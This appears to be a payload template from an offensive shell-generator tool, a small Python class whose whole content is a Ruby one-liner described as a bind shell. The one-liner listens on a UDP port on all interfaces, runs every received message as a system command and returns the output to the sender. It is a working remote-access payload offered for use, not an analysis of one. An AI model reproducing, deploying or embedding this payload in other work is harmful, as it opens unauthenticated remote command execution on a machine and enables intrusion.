class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Uses ruby UDPSocket to establish a bind shell."
    function    = "bind shell"
    liner       = """ruby -rsocket -e 'require "open3";VAR1=UDPSocket.new;VAR1.bind("0.0.0.0",PORT);loop do VAR2,VAR3=VAR1.recvfrom(1024);VAR4,VAR5,VAR6=Open3.capture3(VAR2);VAR1.send(VAR4,0,VAR3[3],VAR3[1]); end'"""
